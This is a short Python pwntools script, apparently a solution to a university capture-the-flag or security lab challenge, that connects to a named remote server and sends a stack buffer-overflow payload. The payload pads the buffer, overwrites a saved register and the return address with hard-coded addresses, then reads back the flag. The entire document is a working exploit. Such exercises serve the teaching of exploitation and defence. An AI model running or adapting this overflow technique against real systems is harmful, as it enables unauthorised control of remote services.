from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt" 
PORT = 25155

s = remote(SERVER, PORT, timeout=9999)

d_buffer_ebx = 36
d_ebx_return = 4

s.sendline(b"1" * d_buffer_ebx + p32(0x804a001) + b'1' * d_ebx_return + p32(0x080487d9))
time.sleep(1)
flag = s.recv(512).decode()
print(flag)
